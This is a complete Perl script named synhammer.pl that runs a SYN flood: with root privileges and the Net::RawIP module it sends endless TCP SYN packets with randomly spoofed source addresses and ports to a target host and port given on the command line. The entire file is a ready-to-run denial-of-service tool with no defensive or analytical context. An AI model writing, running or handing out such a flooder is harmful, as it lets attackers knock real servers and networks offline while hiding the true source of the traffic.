#!/usr/bin/perl
# synhammer.pl
# Requires perl, Net::RawIP module, and root privileges

use Net::RawIP;

my $login = (getpwuid $>);
die "must run as root" if $login ne 'root';

sub geraIP(){
	$range = 255;
	$iA = int(rand($range));
	$iB = int(rand($range));
	$iC = int(rand($range));
	$iD = int(rand($range));

	$ip = $iA . "." . $iB . "." . $iC . "." . $iD;
	#print "$ip\n";
	
	return $ip;
}

if($#ARGV == 1) {
	($dst,$port) = @ARGV;
	$a = new Net::RawIP;
	while(1) {
		$src_port = rand(65534)+1;
		$src = geraIP();
		$a->set({ip => {saddr => $src,daddr => $dst}, tcp => {source => $src_port, dest => $port, syn => 1, ttl => rand(255)}});
		$a->send;
	}
} else {
	print "    Args: Target Port\n!!!MUST BE RUN AS ROOT!!!\n";
} 

